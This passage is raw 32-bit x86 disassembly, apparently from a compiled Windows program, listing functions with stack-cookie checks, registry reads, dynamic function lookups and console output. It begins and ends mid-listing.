  405c53:	sub    eax,0x1
  405c56:	je     0x405c62
  405c58:	sub    eax,0x1
  405c5b:	jne    0x405c6b
  405c5d:	push   DWORD PTR [esi+0x4]
  405c60:	jmp    0x405c65
  405c62:	push   DWORD PTR [esi+0x8]
  405c65:	call   DWORD PTR ds:0x4141bc
  405c6b:	xor    eax,eax
  405c6d:	mov    DWORD PTR [esi+0x4],eax
  405c70:	mov    DWORD PTR [esi+0x8],eax
  405c73:	mov    DWORD PTR [esi+0xc],eax
  405c76:	pop    esi
  405c77:	ret    
  405c78:	int3   
  405c79:	int3   
  405c7a:	int3   
  405c7b:	int3   
  405c7c:	int3   
  405c7d:	int3   
  405c7e:	int3   
  405c7f:	int3   
  405c80:	mov    edi,edi
  405c82:	push   ebp
  405c83:	mov    ebp,esp
  405c85:	push   esi
  405c86:	mov    esi,ecx
  405c88:	call   0x405c45
  405c8d:	test   BYTE PTR [ebp+0x8],0x1
  405c91:	je     0x405c9a
  405c93:	push   esi
  405c94:	call   DWORD PTR ds:0x4141bc
  405c9a:	mov    eax,esi
  405c9c:	pop    esi
  405c9d:	pop    ebp
  405c9e:	ret    0x4
  405ca1:	int3   
  405ca2:	int3   
  405ca3:	int3   
  405ca4:	int3   
  405ca5:	int3   
  405ca6:	mov    edi,edi
  405ca8:	push   ebp
  405ca9:	mov    ebp,esp
  405cab:	push   esi
  405cac:	push   DWORD PTR [ebp+0x8]
  405caf:	mov    esi,ecx
  405cb1:	push   0x401070
  405cb6:	push   DWORD PTR ds:0x4130e8
  405cbc:	call   0x40e818
  405cc1:	add    esp,0xc
  405cc4:	push   0x0
  405cc6:	push   0x0
  405cc8:	push   DWORD PTR [ebp+0x8]
  405ccb:	call   DWORD PTR ds:0x41411c
  405cd1:	xor    ecx,ecx
  405cd3:	mov    DWORD PTR [esi],eax
  405cd5:	test   eax,eax
  405cd7:	pop    esi
  405cd8:	setne  cl
  405cdb:	mov    eax,ecx
  405cdd:	pop    ebp
  405cde:	ret    0x4
  405ce1:	int3   
  405ce2:	int3   
  405ce3:	int3   
  405ce4:	int3   
  405ce5:	int3   
  405ce6:	mov    edi,edi
  405ce8:	push   ebp
  405ce9:	mov    ebp,esp
  405ceb:	sub    esp,0x244
  405cf1:	mov    eax,ds:0x413004
  405cf6:	xor    eax,ebp
  405cf8:	mov    DWORD PTR [ebp-0x4],eax
  405cfb:	push   ebx
  405cfc:	push   esi
  405cfd:	push   edi
  405cfe:	push   0x105
  405d03:	xor    edi,edi
  405d05:	mov    DWORD PTR [ebp-0x22c],ecx
  405d0b:	lea    eax,[ebp-0x218]
  405d11:	mov    ebx,edx
  405d13:	push   edi
  405d14:	push   eax
  405d15:	mov    DWORD PTR [ebp-0x224],ebx
  405d1b:	call   0x412060
  405d20:	add    esp,0xc
  405d23:	xor    eax,eax
  405d25:	mov    DWORD PTR [ebp-0x220],eax
  405d2b:	lea    eax,[ebp-0x220]
  405d31:	push   ebx
  405d32:	push   0x2
  405d34:	push   eax
  405d35:	push   0x401068
  405d3a:	push   0x4010c0
  405d3f:	push   0x4010d8
  405d44:	call   DWORD PTR ds:0x414114
  405d4a:	push   0x4051a0
  405d4f:	call   DWORD PTR ds:0x4140a8
  405d55:	xor    esi,esi
  405d57:	inc    esi
  405d58:	test   eax,eax
  405d5a:	je     0x405e10
  405d60:	push   0x4051c4
  405d65:	push   eax
  405d66:	call   DWORD PTR ds:0x414048
  405d6c:	mov    ebx,eax
  405d6e:	test   ebx,ebx
  405d70:	je     0x405e10
  405d76:	lea    eax,[ebp-0x21c]
  405d7c:	push   eax
  405d7d:	call   DWORD PTR ds:0x414054
  405d83:	push   eax
  405d84:	mov    ecx,ebx
  405d86:	call   DWORD PTR ds:0x414220
  405d8c:	call   ebx
  405d8e:	test   eax,eax
  405d90:	je     0x405e10
  405d92:	cmp    DWORD PTR [ebp-0x21c],edi
  405d98:	je     0x405e10
  405d9a:	mov    ecx,0x4011bc
  405d9f:	lea    eax,[ebp-0x220]
  405da5:	mov    dx,WORD PTR [eax]
  405da8:	cmp    dx,WORD PTR [ecx]
  405dab:	jne    0x405dcb
  405dad:	test   dx,dx
  405db0:	je     0x405dc7
  405db2:	mov    dx,WORD PTR [eax+0x2]
  405db6:	cmp    dx,WORD PTR [ecx+0x2]
  405dba:	jne    0x405dcb
  405dbc:	add    eax,0x4
  405dbf:	add    ecx,0x4
  405dc2:	test   dx,dx
  405dc5:	jne    0x405da5
  405dc7:	mov    eax,edi
  405dc9:	jmp    0x405dcf
  405dcb:	sbb    eax,eax
  405dcd:	or     eax,esi
  405dcf:	test   eax,eax
  405dd1:	jne    0x405e10
  405dd3:	push   0x4011c0
  405dd8:	push   0x900
  405ddd:	push   edi
  405dde:	push   edi
  405ddf:	lea    eax,[ebp-0x218]
  405de5:	push   0x105
  405dea:	push   eax
  405deb:	call   0x410f98
  405df0:	add    esp,0x18
  405df3:	test   eax,eax
  405df5:	jns    0x405e85
  405dfb:	xor    eax,eax
  405dfd:	mov    ecx,DWORD PTR [ebp-0x4]
  405e00:	pop    edi
  405e01:	pop    esi
  405e02:	xor    ecx,ebp
  405e04:	pop    ebx
  405e05:	call   0x411980
  405e0a:	mov    esp,ebp
  405e0c:	pop    ebp
  405e0d:	ret    0x8
  405e10:	lea    eax,[ebp-0x228]
  405e16:	push   eax
  405e17:	push   0x20019
  405e1c:	push   edi
  405e1d:	push   0x4010e8
  405e22:	push   0x80000002
  405e27:	call   DWORD PTR ds:0x414004
  405e2d:	test   eax,eax
  405e2f:	jne    0x405e78
  405e31:	lea    eax,[ebp-0x21c]
  405e37:	mov    DWORD PTR [ebp-0x21c],0x105
  405e41:	push   eax
  405e42:	lea    eax,[ebp-0x218]
  405e48:	mov    DWORD PTR [ebp-0x230],esi
  405e4e:	push   eax
  405e4f:	lea    eax,[ebp-0x230]
  405e55:	push   eax
  405e56:	push   edi
  405e57:	push   0x401170
  405e5c:	push   DWORD PTR [ebp-0x228]
  405e62:	call   DWORD PTR ds:0x414000
  405e68:	push   DWORD PTR [ebp-0x228]
  405e6e:	mov    esi,eax
  405e70:	call   DWORD PTR ds:0x414008
  405e76:	jmp    0x405e7d
  405e78:	mov    esi,0x3eb
  405e7d:	test   esi,esi
  405e7f:	jne    0x405dfb
  405e85:	lea    eax,[ebp-0x218]
  405e8b:	mov    DWORD PTR [ebp-0x21c],edi
  405e91:	push   eax
  405e92:	lea    ecx,[ebp-0x21c]
  405e98:	call   0x405ca6
  405e9d:	mov    esi,DWORD PTR [ebp-0x21c]
  405ea3:	test   esi,esi
  405ea5:	je     0x405eb7
  405ea7:	push   0x4011a8
  405eac:	push   esi
  405ead:	call   DWORD PTR ds:0x414048
  405eb3:	mov    ebx,eax
  405eb5:	jmp    0x405eb9
  405eb7:	mov    ebx,edi
  405eb9:	test   ebx,ebx
  405ebb:	jne    0x405ef8
  405ebd:	test   esi,esi
  405ebf:	je     0x405ecf
  405ec1:	push   0x401194
  405ec6:	push   esi
  405ec7:	call   DWORD PTR ds:0x414048
  405ecd:	mov    edi,eax
  405ecf:	test   edi,edi
  405ed1:	jne    0x405ed8
  405ed3:	xor    ebx,ebx
  405ed5:	inc    ebx
  405ed6:	jmp    0x405f3e
  405ed8:	push   DWORD PTR [ebp+0xc]
  405edb:	mov    ecx,edi
  405edd:	push   DWORD PTR [ebp+0x8]
  405ee0:	push   DWORD PTR [ebp-0x224]
  405ee6:	push   DWORD PTR [ebp-0x22c]
  405eec:	call   DWORD PTR ds:0x414220
  405ef2:	call   edi
  405ef4:	mov    ebx,eax
  405ef6:	jmp    0x405f3e
  405ef8:	push   DWORD PTR [ebp+0xc]
  405efb:	mov    eax,DWORD PTR [ebp-0x224]
  405f01:	mov    ecx,ebx
  405f03:	push   DWORD PTR [ebp+0x8]
  405f06:	mov    DWORD PTR [ebp-0x240],0x40143c
  405f10:	push   eax
  405f11:	push   DWORD PTR [ebp-0x22c]
  405f17:	mov    DWORD PTR [ebp-0x238],eax
  405f1d:	mov    DWORD PTR [ebp-0x23c],eax
  405f23:	mov    DWORD PTR [ebp-0x234],edi
  405f29:	call   DWORD PTR ds:0x414220
  405f2f:	call   ebx
  405f31:	lea    ecx,[ebp-0x240]
  405f37:	mov    ebx,eax
  405f39:	call   0x405c45
  405f3e:	test   esi,esi
  405f40:	je     0x405f49
  405f42:	push   esi
  405f43:	call   DWORD PTR ds:0x414120
  405f49:	mov    eax,ebx
  405f4b:	jmp    0x405dfd
  405f50:	int3   
  405f51:	int3   
  405f52:	int3   
  405f53:	int3   
  405f54:	int3   
  405f55:	int3   
  405f56:	int3   
  405f57:	int3   
  405f58:	mov    edi,edi
  405f5a:	push   ebp
  405f5b:	mov    ebp,esp
  405f5d:	and    esp,0xfffffff8
  405f60:	sub    esp,0x9bc
  405f66:	mov    eax,ds:0x413004
  405f6b:	xor    eax,esp
  405f6d:	mov    DWORD PTR [esp+0x9b8],eax
  405f74:	push   ebx
  405f75:	push   esi
  405f76:	xor    esi,esi
  405f78:	lea    ecx,[esp+0x3c]
  405f7c:	push   edi
  405f7d:	mov    ebx,esi
  405f7f:	mov    DWORD PTR [esp+0x18],esi
  405f83:	mov    DWORD PTR [esp+0x1c],esi
  405f87:	mov    DWORD PTR [esp+0x14],esi
  405f8b:	call   0x40fa55
  405f90:	mov    DWORD PTR [esp+0x20],esi
  405f94:	mov    DWORD PTR [esp+0x24],esi
  405f98:	call   DWORD PTR ds:0x414124
  405f9e:	push   esi
  405f9f:	mov    DWORD PTR [esp+0x40],eax
  405fa3:	call   DWORD PTR ds:0x414118
  405fa9:	push   0x4051a0
  405fae:	mov    DWORD PTR [esp+0x14],eax
  405fb2:	call   DWORD PTR ds:0x4140e4
  405fb8:	mov    edi,eax
  405fba:	test   edi,edi
  405fbc:	je     0x405ffe
  405fbe:	push   0x4051b0
  405fc3:	push   edi
  405fc4:	call   DWORD PTR ds:0x414048
  405fca:	mov    DWORD PTR [esp+0x28],eax
  405fce:	test   eax,eax
  405fd0:	je     0x405ff5
  405fd2:	push   esi
  405fd3:	push   esi
  405fd4:	push   0x1
  405fd6:	call   DWORD PTR ds:0x4140c4
  405fdc:	mov    ecx,DWORD PTR [esp+0x34]
  405fe0:	push   eax
  405fe1:	call   DWORD PTR ds:0x414220
  405fe7:	call   DWORD PTR [esp+0x38]
  405feb:	test   eax,eax
  405fed:	jne    0x405ff5
  405fef:	call   DWORD PTR ds:0x414074
  405ff5:	push   edi
  405ff6:	call   DWORD PTR ds:0x414120
  405ffc:	jmp    0x406004
  405ffe:	call   DWORD PTR ds:0x414074
  406004:	mov    eax,ds:0x4130e8
  406009:	cmp    eax,0xffffffff
  40600c:	jne    0x406018
  40600e:	call   0x40e5f0
  406013:	mov    eax,ds:0x4130e8
  406018:	mov    edi,0x4011d8
  40601d:	push   edi
  40601e:	push   eax
  40601f:	call   0x40e818
  406024:	pop    ecx
  406025:	pop    ecx
  406026:	call   DWORD PTR ds:0x41404c
  40602c:	push   eax
  40602d:	push   0x401248
  406032:	push   DWORD PTR ds:0x4130e8
  406038:	call   0x40e818
  40603d:	add    esp,0xc
  406040:	push   edi
  406041:	push   DWORD PTR ds:0x4130e8
  406047:	call   0x40e818
  40604c:	push   0x20a
  406051:	lea    eax,[esp+0x18c]
  406058:	push   esi
  406059:	push   eax
  40605a:	call   0x412060
  40605f:	pop    ecx
  406060:	lea    ecx,[esp+0x3c]
  406064:	call   0x40f4fe
  406069:	push   ecx
  40606a:	lea    eax,[esp+0x184]
  406071:	push   eax
  406072:	lea    eax,[esp+0x1c]
  406076:	push   eax
  406077:	push   DWORD PTR [esp+0x48]
  40607b:	lea    ecx,[esp+0x3c]
  40607f:	call   0x40f7a6
  406084:	mov    edi,0x800
  406089:	test   eax,eax
  40608b:	je     0x40629b
  406091:	xor    eax,eax
  406093:	cmp    BYTE PTR [esp+0x14],al
  406097:	push   ecx
  406098:	push   ecx
  406099:	setne  al
  40609c:	push   eax
  40609d:	push   ecx
  40609e:	lea    ecx,[esp+0x30]
  4060a2:	call   0x40d77e
  4060a7:	test   eax,eax
  4060a9:	je     0x406292
  4060af:	push   esi
  4060b0:	push   esi
  4060b1:	lea    edx,[esp+0x188]
  4060b8:	lea    ecx,[esp+0x1c]
  4060bc:	call   0x405ce6
  4060c1:	test   eax,eax
  4060c3:	je     0x40629e
  4060c9:	lea    eax,[esp+0x180]
  4060d0:	push   eax
  4060d1:	push   DWORD PTR [esp+0x18]
  4060d5:	push   0x4012a0
  4060da:	push   DWORD PTR ds:0x4130e8
  4060e0:	call   0x40e818
  4060e5:	mov    edx,DWORD PTR [esp+0x24]
  4060e9:	add    esp,0x10
  4060ec:	test   dl,0x10
  4060ef:	je     0x40610e
  4060f1:	xor    ebx,ebx
  4060f3:	inc    ebx
  4060f4:	mov    edi,esi
  4060f6:	push   0x1
  4060f8:	push   edi
  4060f9:	lea    edx,[esp+0x188]
  406100:	lea    ecx,[esp+0x1c]
  406104:	call   0x405ce6
  406109:	jmp    0x40629e
  40610e:	test   dl,0x1
  406111:	je     0x40615e
  406113:	cmp    edx,0x1
  406116:	je     0x406120
  406118:	cmp    edx,0x801
  40611e:	jne    0x4060f1
  406120:	xor    eax,eax
  406122:	cmp    ax,WORD PTR [esp+0x180]
  40612a:	je     0x4060f1
  40612c:	test   edi,edx
  40612e:	mov    edi,DWORD PTR [esp+0x10]
  406132:	jne    0x406146
  406134:	lea    edx,[esp+0x180]
  40613b:	mov    ecx,edi
  40613d:	call   0x40db05
  406142:	test   eax,eax
  406144:	je     0x4060f4
  406146:	push   0x1
  406148:	lea    edx,[esp+0x184]
  40614f:	mov    ecx,edi
  406151:	call   0x40dcb7
  406156:	mov    edi,eax
  406158:	mov    DWORD PTR [esp+0x1c],edi
  40615c:	jmp    0x4060f6
  40615e:	test   dl,0x2
  406161:	je     0x406183
  406163:	cmp    edx,0x2
  406166:	jne    0x4060f1
  406168:	xor    eax,eax
  40616a:	cmp    ax,WORD PTR [esp+0x180]
  406172:	jne    0x4060f1
  406178:	mov    ecx,DWORD PTR [esp+0x10]
  40617c:	call   0x40d523
  406181:	jmp    0x406156
  406183:	test   dl,0x8
  406186:	je     0x40621e
  40618c:	cmp    edx,0x8
  40618f:	jne    0x4060f1
  406195:	xor    eax,eax
  406197:	cmp    ax,WORD PTR [esp+0x180]
  40619f:	jne    0x4060f1
  4061a5:	lea    eax,[esp+0x5a0]
  4061ac:	push   eax
  4061ad:	push   0x104
  4061b2:	call   DWORD PTR ds:0x41408c
  4061b8:	test   eax,eax
  4061ba:	je     0x4061ee
  4061bc:	sub    esp,0xc
  4061bf:	lea    ecx,[esp+0x5ac]
  4061c6:	mov    edx,0x105
  4061cb:	push   0x401338
  4061d0:	call   0x410f31
  4061d5:	test   eax,eax
  4061d7:	js     0x4061ee
  4061d9:	mov    ecx,DWORD PTR [esp+0x10]
  4061dd:	lea    edx,[esp+0x5a0]
  4061e4:	call   0x40d3a7
  4061e9:	jmp    0x406156
  4061ee:	mov    ebx,DWORD PTR [esp+0x38]
  4061f2:	test   ebx,ebx
  4061f4:	je     0x4064ac
  4061fa:	mov    edi,esi
  4061fc:	cmp    DWORD PTR [esp+0x2c],esi
  406200:	jbe    0x406212
  406202:	push   DWORD PTR [ebx+edi*8]
  406205:	call   DWORD PTR ds:0x4141bc
  40620b:	inc    edi
  40620c:	cmp    edi,DWORD PTR [esp+0x2c]
  406210:	jb     0x406202
  406212:	push   ebx
  406213:	call   DWORD PTR ds:0x4141bc
  406219:	jmp    0x4064ac
  40621e:	test   dl,0x4
  406221:	jne    0x4060f1
  406227:	mov    eax,edx
  406229:	xor    ecx,ecx
  40622b:	and    eax,0x5000
  406230:	cmp    eax,0x4000
  406235:	lea    eax,[esp+0x20]
  406239:	push   eax
  40623a:	setne  cl
  40623d:	mov    eax,edx
  40623f:	and    eax,0x2000
  406244:	push   eax
  406245:	mov    eax,edx
  406247:	push   ecx
  406248:	mov    ecx,DWORD PTR [esp+0x1c]
  40624c:	and    eax,edi
  40624e:	push   eax
  40624f:	mov    eax,edx
  406251:	and    edx,0x400
  406257:	and    eax,0x200
  40625c:	push   eax
  40625d:	push   edx
  40625e:	lea    edx,[esp+0x198]
  406265:	call   0x40ba92
  40626a:	mov    edi,eax
  40626c:	mov    DWORD PTR [esp+0x1c],edi
  406270:	test   edi,edi
  406272:	jns    0x4060f6
  406278:	push   edi
  406279:	push   edi
  40627a:	push   0x401340
  40627f:	push   DWORD PTR ds:0x4130e8
  406285:	call   0x40e818
  40628a:	add    esp,0x10
  40628d:	jmp    0x4060f6
  406292:	xor    eax,eax
  406294:	inc    eax
  406295:	mov    DWORD PTR [esp+0x18],eax
  406299:	jmp    0x40629e
  40629b:	xor    ebx,ebx
  40629d:	inc    ebx
  40629e:	mov    eax,DWORD PTR [esp+0x38]
  4062a2:	test   eax,eax
  4062a4:	je     0x4062cd
  4062a6:	mov    edi,esi
  4062a8:	cmp    DWORD PTR [esp+0x2c],esi
  4062ac:	jbe    0x4062c6
  4062ae:	mov    esi,eax
  4062b0:	push   DWORD PTR [esi+edi*8]
  4062b3:	call   DWORD PTR ds:0x4141bc
  4062b9:	inc    edi
  4062ba:	cmp    edi,DWORD PTR [esp+0x2c]
  4062be:	jb     0x4062b0
  4062c0:	mov    eax,DWORD PTR [esp+0x38]
  4062c4:	xor    esi,esi
  4062c6:	push   eax
  4062c7:	call   DWORD PTR ds:0x4141bc
  4062cd:	mov    edi,DWORD PTR ds:0x413474
  4062d3:	test   edi,edi
  4062d5:	je     0x4062f3
  4062d7:	cmp    DWORD PTR [edi],0x0
  4062da:	je     0x4062ec
  4062dc:	push   DWORD PTR [edi]
  4062de:	call   DWORD PTR ds:0x414120
  4062e4:	mov    DWORD PTR [edi],esi
  4062e6:	mov    edi,DWORD PTR ds:0x413474
  4062ec:	push   edi
  4062ed:	call   DWORD PTR ds:0x4141bc
  4062f3:	mov    edi,DWORD PTR ds:0x41346c
  4062f9:	test   edi,edi
  4062fb:	je     0x406319
  4062fd:	cmp    DWORD PTR [edi],0x0
  406300:	je     0x406312
  406302:	push   DWORD PTR [edi]
  406304:	call   DWORD PTR ds:0x414120
  40630a:	mov    DWORD PTR [edi],esi
  40630c:	mov    edi,DWORD PTR ds:0x41346c
  406312:	push   edi
  406313:	call   DWORD PTR ds:0x4141bc
  406319:	mov    edi,DWORD PTR ds:0x413478
  40631f:	test   edi,edi
  406321:	je     0x40633f
  406323:	cmp    DWORD PTR [edi],0x0
  406326:	je     0x406338
  406328:	push   DWORD PTR [edi]
  40632a:	call   DWORD PTR ds:0x414120
  406330:	mov    DWORD PTR [edi],esi
  406332:	mov    edi,DWORD PTR ds:0x413478
  406338:	push   edi
  406339:	call   DWORD PTR ds:0x4141bc
  40633f:	mov    edi,DWORD PTR ds:0x413470
  406345:	test   edi,edi
  406347:	je     0x406365
  406349:	cmp    DWORD PTR [edi],0x0
  40634c:	je     0x40635e
  40634e:	push   DWORD PTR [edi]
  406350:	call   DWORD PTR ds:0x414120
  406356:	mov    DWORD PTR [edi],esi
  406358:	mov    edi,DWORD PTR ds:0x413470
  40635e:	push   edi
  40635f:	call   DWORD PTR ds:0x4141bc
  406365:	lea    ecx,[esp+0x20]
  406369:	call   0x40d89b
  40636e:	test   ebx,ebx
  406370:	je     0x4063f7
  406376:	push   0x4013ac
  40637b:	push   DWORD PTR ds:0x4130e8
  406381:	call   0x40e818
  406386:	test   DWORD PTR [esp+0x1c],0x800
  40638e:	pop    ecx
  40638f:	pop    ecx
  406390:	jne    0x40644d
  406396:	push   0xfd2
  40639b:	call   DWORD PTR ds:0x4141b0
  4063a1:	mov    edi,eax
  4063a3:	test   edi,edi
  4063a5:	je     0x40644d
  4063ab:	push   0x104
  4063b0:	lea    eax,[esp+0x394]
  4063b7:	push   eax
  4063b8:	push   0xd2
  4063bd:	push   DWORD PTR [esp+0x1c]
  4063c1:	call   DWORD PTR ds:0x414188
  4063c7:	push   0x7e8
  4063cc:	push   edi
  4063cd:	push   0xc8
  4063d2:	push   DWORD PTR [esp+0x1c]
  4063d6:	call   DWORD PTR ds:0x414188
  4063dc:	push   0x40
  4063de:	lea    eax,[esp+0x394]
  4063e5:	push   eax
  4063e6:	push   edi
  4063e7:	push   esi
  4063e8:	call   DWORD PTR ds:0x414168
  4063ee:	push   edi
  4063ef:	call   DWORD PTR ds:0x4141bc
  4063f5:	jmp    0x40644d
  4063f7:	mov    eax,DWORD PTR [esp+0x18]
  4063fb:	test   eax,eax
  4063fd:	je     0x406451
  4063ff:	mov    edi,DWORD PTR [esp+0x10]
  406403:	lea    eax,[esp+0x390]
  40640a:	push   0x104
  40640f:	push   eax
  406410:	push   0xd2
  406415:	push   edi
  406416:	call   DWORD PTR ds:0x414188
  40641c:	push   0x104
  406421:	lea    eax,[esp+0x7b4]
  406428:	push   eax
  406429:	push   0xd1
  40642e:	push   edi
  40642f:	call   DWORD PTR ds:0x414188
  406435:	push   esi
  406436:	lea    eax,[esp+0x394]
  40643d:	push   eax
  40643e:	lea    eax,[esp+0x7b8]
  406445:	push   eax
  406446:	push   esi
  406447:	call   DWORD PTR ds:0x414168
  40644d:	mov    eax,DWORD PTR [esp+0x18]
  406451:	cmp    DWORD PTR [esp+0x1c],0x0
  406456:	jl     0x406463
  406458:	test   ebx,ebx
  40645a:	jne    0x406463
  40645c:	test   eax,eax
  40645e:	jne    0x406463
  406460:	xor    esi,esi
  406462:	inc    esi
  406463:	mov    edi,0x4011d8
  406468:	push   edi
  406469:	push   DWORD PTR ds:0x4130e8
  40646f:	call   0x40e818
  406474:	pop    ecx
  406475:	pop    ecx
  406476:	call   DWORD PTR ds:0x41404c
  40647c:	push   eax
  40647d:	push   0x4013e0
  406482:	push   DWORD PTR ds:0x4130e8
  406488:	call   0x40e818
  40648d:	add    esp,0xc
  406490:	push   edi
  406491:	push   DWORD PTR ds:0x4130e8
  406497:	call   0x40e818
  40649c:	cmp    DWORD PTR ds:0x4130e8,0xffffffff
  4064a3:	pop    ecx
  4064a4:	pop    ecx
  4064a5:	je     0x4064ac
  4064a7:	call   0x40e67a
  4064ac:	lea    ecx,[esp+0x20]
  4064b0:	call   0x40d89b
  4064b5:	mov    ecx,DWORD PTR [esp+0x9c4]
  4064bc:	mov    eax,esi
  4064be:	pop    edi
  4064bf:	pop    esi
  4064c0:	pop    ebx
  4064c1:	xor    ecx,esp
  4064c3:	call   0x411980
  4064c8:	mov    esp,ebp
  4064ca:	pop    ebp
  4064cb:	ret    0x10
  4064ce:	int3   
  4064cf:	int3   
  4064d0:	int3   
  4064d1:	int3   
  4064d2:	int3   
  4064d3:	mov    edi,edi
  4064d5:	push   ebp
  4064d6:	mov    ebp,esp
  4064d8:	push   ecx
  4064d9:	push   ecx
  4064da:	push   ebx
  4064db:	mov    ebx,DWORD PTR [ebp+0x14]
  4064de:	push   esi
  4064df:	push   edi
  4064e0:	push   ebx
  4064e1:	push   ecx
  4064e2:	mov    edi,edx
  4064e4:	mov    DWORD PTR [ebp-0x8],ecx
  4064e7:	call   0x406796
  4064ec:	mov    esi,eax
  4064ee:	test   esi,esi
  4064f0:	js     0x4065b0
  4064f6:	mov    eax,DWORD PTR [ebp+0x8]
  4064f9:	test   ebx,0x100
  4064ff:	je     0x40650a
  406501:	test   eax,eax
  406503:	jne    0x40650a
  406505:	mov    eax,0x401068
  40650a:	xor    esi,esi
  40650c:	test   ebx,0xffffe000
  406512:	je     0x406524
  406514:	mov    esi,0x80070057
  406519:	test   edi,edi
  40651b:	je     0x406590
  40651d:	xor    eax,eax
  40651f:	mov    WORD PTR [ecx],ax
  406522:	jmp    0x406590
  406524:	test   edi,edi
  406526:	jne    0x406542
  406528:	cmp    WORD PTR [eax],si
  40652b:	je     0x4065b9
  406531:	mov    esi,ecx
  406533:	neg    esi
  406535:	sbb    esi,esi
  406537:	and    esi,0x23
  40653a:	add    esi,0x80070057
  406540:	jmp    0x406590
  406542:	push   ecx
  406543:	push   eax
  406544:	lea    eax,[ebp-0x4]
  406547:	mov    DWORD PTR [ebp-0x4],esi
  40654a:	push   eax
  40654b:	call   0x4067ca
  406550:	mov    ecx,DWORD PTR [ebp-0x4]
  406553:	mov    esi,eax
  406555:	mov    eax,edi
  406557:	sub    eax,ecx
  406559:	test   esi,esi
  40655b:	js     0x40658d
  40655d:	test   ebx,0x200
  406563:	je     0x4065b9
  406565:	cmp    eax,0x1
  406568:	jbe    0x4065b9
  40656a:	add    eax,eax
  40656c:	cmp    eax,0x2
  40656f:	jbe    0x4065b9
  406571:	add    eax,0xfffffffe
  406574:	push   eax
  406575:	movzx  eax,bl
  406578:	push   eax
  406579:	mov    eax,DWORD PTR [ebp-0x8]
  40657c:	lea    eax,[eax+ecx*2]
  40657f:	add    eax,0x2
  406582:	push   eax
  406583:	call   0x412060
  406588:	add    esp,0xc
  40658b:	jmp    0x4065b9
  40658d:	mov    ecx,DWORD PTR [ebp-0x8]
  406590:	test   ebx,0x1c00
  406596:	je     0x4065b9
  406598:	test   edi,edi
  40659a:	je     0x4065b9
  40659c:	push   ebx
  40659d:	lea    eax,[ebp-0x8]
  4065a0:	push   eax
  4065a1:	lea    eax,[ebp-0x4]
  4065a4:	push   eax
  4065a5:	push   ecx
  4065a6:	lea    edx,[edi+edi*1]
  4065a9:	call   0x406828
  4065ae:	jmp    0x4065b9
  4065b0:	test   edi,edi
  4065b2:	je     0x4065b9
  4065b4:	xor    eax,eax
  4065b6:	mov    WORD PTR [ecx],ax
  4065b9:	pop    edi
  4065ba:	mov    eax,esi
  4065bc:	pop    esi
  4065bd:	pop    ebx
  4065be:	mov    esp,ebp
  4065c0:	pop    ebp
  4065c1:	ret    0x10
  4065c4:	int3   
  4065c5:	int3   
  4065c6:	int3   
  4065c7:	int3   
  4065c8:	int3   
  4065c9:	mov    edi,edi
  4065cb:	push   ebp
  4065cc:	mov    ebp,esp
  4065ce:	mov    edx,DWORD PTR [ebp+0xc]
  4065d1:	sub    esp,0xc
  4065d4:	push   ebx
  4065d5:	mov    ebx,DWORD PTR [ebp+0x8]
  4065d8:	push   esi
  4065d9:	push   edi
  4065da:	mov    edi,DWORD PTR [ebp+0x18]
  4065dd:	push   edi
  4065de:	push   ecx
  4065df:	mov    ecx,ebx
  4065e1:	call   0x406796
  4065e6:	mov    esi,eax
  4065e8:	test   esi,esi
  4065ea:	js     0x40671e
  4065f0:	mov    ecx,DWORD PTR [ebp+0x1c]
  4065f3:	mov    eax,edx
  4065f5:	mov    DWORD PTR [ebp-0x4],ebx
  4065f8:	mov    DWORD PTR [ebp-0x8],eax
  4065fb:	test   edi,0x100
  406601:	je     0x40660f
  406603:	test   ecx,ecx
  406605:	jne    0x40660f
  406607:	mov    ecx,0x401068
  40660c:	mov    DWORD PTR [ebp+0x1c],ecx
  40660f:	xor    esi,esi
  406611:	test   edi,0xffffe000
  406617:	je     0x40667a
  406619:	mov    esi,0x80070057
  40661e:	test   edx,edx
  406620:	je     0x406627
  406622:	xor    ecx,ecx
  406624:	mov    WORD PTR [ebx],cx
  406627:	mov    ecx,DWORD PTR [ebp+0x18]
  40662a:	test   ecx,0x1c00
  406630:	je     0x40664c
  406632:	test   edx,edx
  406634:	je     0x40664c
  406636:	push   ecx
  406637:	lea    eax,[ebp-0x8]
  40663a:	add    edx,edx
  40663c:	push   eax
  40663d:	lea    eax,[ebp-0x4]
  406640:	push   eax
  406641:	push   ecx
  406642:	mov    ecx,ebx
  406644:	call   0x406828
  406649:	mov    eax,DWORD PTR [ebp-0x8]
  40664c:	test   esi,esi
  40664e:	jns    0x40665c
  406650:	cmp    esi,0x8007007a
  406656:	jne    0x406727
  40665c:	mov    edi,DWORD PTR [ebp-0x4]
  40665f:	mov    ecx,DWORD PTR [ebp+0x10]
  406662:	test   ecx,ecx
  406664:	je     0x406668
  406666:	mov    DWORD PTR [ecx],edi
  406668:	mov    ecx,DWORD PTR [ebp+0x14]
  40666b:	test   ecx,ecx
  40666d:	je     0x406727
  406673:	mov    DWORD PTR [ecx],eax
  406675:	jmp    0x406727
  40667a:	test   edx,edx
  40667c:	jne    0x406694
  40667e:	cmp    WORD PTR [ecx],si
  406681:	je     0x40665c
  406683:	mov    esi,ebx
  406685:	neg    esi
  406687:	sbb    esi,esi
  406689:	and    esi,0x23
  40668c:	add    esi,0x80070057
  406692:	jmp    0x406627
  406694:	lea    eax,[ebp+0x20]
  406697:	push   eax
  406698:	push   ecx
  406699:	lea    edi,[edx-0x1]
  40669c:	push   edi
  40669d:	push   ebx
  40669e:	call   DWORD PTR ds:0x414208
  4066a4:	add    esp,0x10
  4066a7:	test   eax,eax
  4066a9:	js     0x4066b5
  4066ab:	cmp    eax,edi
  4066ad:	ja     0x4066b5
  4066af:	je     0x4066ba
  4066b1:	mov    edi,eax
  4066b3:	jmp    0x4066c0
  4066b5:	mov    esi,0x8007007a
  4066ba:	xor    eax,eax
  4066bc:	mov    WORD PTR [ebx+edi*2],ax
  4066c0:	mov    edx,DWORD PTR [ebp+0xc]
  4066c3:	lea    eax,[ebx+edi*2]
  4066c6:	mov    DWORD PTR [ebp-0x4],eax
  4066c9:	mov    eax,edx
  4066cb:	sub    eax,edi
  4066cd:	mov    DWORD PTR [ebp-0xc],eax
  4066d0:	mov    DWORD PTR [ebp-0x8],eax
  4066d3:	test   esi,esi
  4066d5:	js     0x406627
  4066db:	mov    ecx,DWORD PTR [ebp+0x18]
  4066de:	test   ecx,0x200
  4066e4:	je     0x40665c
  4066ea:	cmp    eax,0x1
  4066ed:	jbe    0x40665c
  4066f3:	mov    edi,DWORD PTR [ebp-0x4]
  4066f6:	lea    edx,[eax+eax*1]
  4066f9:	cmp    edx,0x2
  4066fc:	jbe    0x40665f
  406702:	lea    eax,[edx-0x2]
